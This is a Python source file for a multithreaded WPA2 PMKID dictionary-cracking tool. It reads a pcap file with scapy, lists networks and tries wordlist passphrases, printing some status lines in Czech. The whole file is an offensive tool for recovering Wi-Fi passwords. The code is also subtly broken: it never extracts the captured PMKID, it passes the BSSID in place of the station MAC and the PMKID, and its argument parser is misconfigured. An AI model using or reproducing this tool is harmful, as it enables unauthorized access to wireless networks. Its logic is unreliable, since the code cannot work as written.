import hmac
from hashlib import pbkdf2_hmac, sha1
import argparse
import threading
import concurrent.futures
import time
from scapy.all import rdpcap, Dot11, Dot11Beacon, Dot11Elt, EAPOL

def calculate_pmkid(pmk, ap_mac, sta_mac):
    """
    Calculates the PMKID with HMAC-SHA1[pmk + ("PMK Name" + bssid + clientmac)]
    128 bit PMKID will be matched with captured PMKID to check if passphrase is valid
    """
    pmkid = hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, sha1).digest()[:16]
    return pmkid

def find_pw_chunk(pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event):
    """
    Finds the passphrase by computing pmk and passing into calculate_pmkid function.
    256 bit pmk calculation: passphrase + salt(ssid) => PBKDF2(HMAC-SHA1) of 4096 iterations
    """
    for pw in pw_list:
        if stop_event.is_set():
            break
        password = pw.strip()
        pmk = pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
        pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
        print(f"[{time.strftime('%H:%M:%S')}] Vyzkoušené klíče: {pw_list.index(pw) + 1}/{len(pw_list)} - {password}")
        if pmkid == captured_pmkid:
            print(f"\n[+] HESLO NALEZENO! [ {password} ]")
            stop_event.set()
            break
        else:
            print(f"Zkouším Heslo: {password}")

def list_networks(pcap_file):
    """
    Parse pcap file to list SSIDs, BSSIDs, and handshake statuses.
    """
    networks = []
    packets = rdpcap(pcap_file)
    
    # Find Beacon frames to get the AP's SSID and BSSID
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode()
            bssid = pkt[Dot11].addr2
            networks.append({"ssid": ssid, "bssid": bssid, "handshake": False})
    
    # Find EAPOL (handshake) frames to mark networks that have handshakes
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            bssid = pkt[Dot11].addr2
            for network in networks:
                if network["bssid"] == bssid:
                    network["handshake"] = True
    
    return networks

def main():
    parser = argparse.ArgumentParser(prog='pmkidcracker', 
                                    description='A multithreaded tool to crack WPA2 passphrase using obtained PMKID without clients or de-authentication.',
                                    usage='%(prog)s -P WORDLIST capture/cap/pcap -t THREADS')

    parser.add_argument("-P", "--wordlist", help="Dictionary wordlist to use", required=True)
    parser.add_argument("pcapfile", help="Capture file (pcap/cap) to use", required=True)
    parser.add_argument("-t", "--threads", help="Number of threads (Default=10)", required=False)
    args = parser.parse_args()

    # List networks in capture file
    networks = list_networks(args.pcapfile)

    if len(networks) > 1:
        print("\n[+] Multiple networks found:")
        for idx, net in enumerate(networks, 1):
            status = "Handshake" if net["handshake"] else "NIC"
            print(f"[{idx}] SSID: {net['ssid']} | BSSID: {net['bssid']} - {status}")
        
        network_choice = int(input("\n[+] Choose network (1-{0}): ".format(len(networks)))) - 1
        selected_network = networks[network_choice]
        print(f"[*] Selected network: {selected_network['ssid']} | {selected_network['bssid']}")
        if not selected_network["handshake"]:
            print("[!] No handshake found, unable to crack.")
            return
    elif len(networks) == 1:
        selected_network = networks[0]
        print(f"[*] Only one network found: {selected_network['ssid']} | {selected_network['bssid']}")
        if not selected_network["handshake"]:
            print("[!] No handshake found, unable to crack.")
            return
    else:
        print("[!] No networks found in the capture file.")
        return

    bssid = selected_network["bssid"]
    ssid = selected_network["ssid"].encode()

    workers = 10
    if args.threads is not None:
        workers = int(args.threads)

    print(f"[*] Starting Crack...")

    bssid_bytes = bytes.fromhex(bssid.replace(":", ""))
    
    stop_event = threading.Event()

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor, open(args.wordlist, "r", encoding='ISO-8859-1') as file:
        start = time.perf_counter()
        chunk_size = 100000
        futures = []

        while True:
            pw_list = file.readlines(chunk_size)
            if not pw_list:
                break

            if stop_event.is_set():
                break

            future = executor.submit(find_pw_chunk, pw_list, ssid, bssid_bytes, bssid_bytes, bssid_bytes, stop_event)
            futures.append(future)

        for future in concurrent.futures.as_completed(futures):
            pass

    finish = time.perf_counter()
    print(f'[+] Finished in {round(finish-start, 2)} second(s)')

if __name__ == '__main__':
    main()
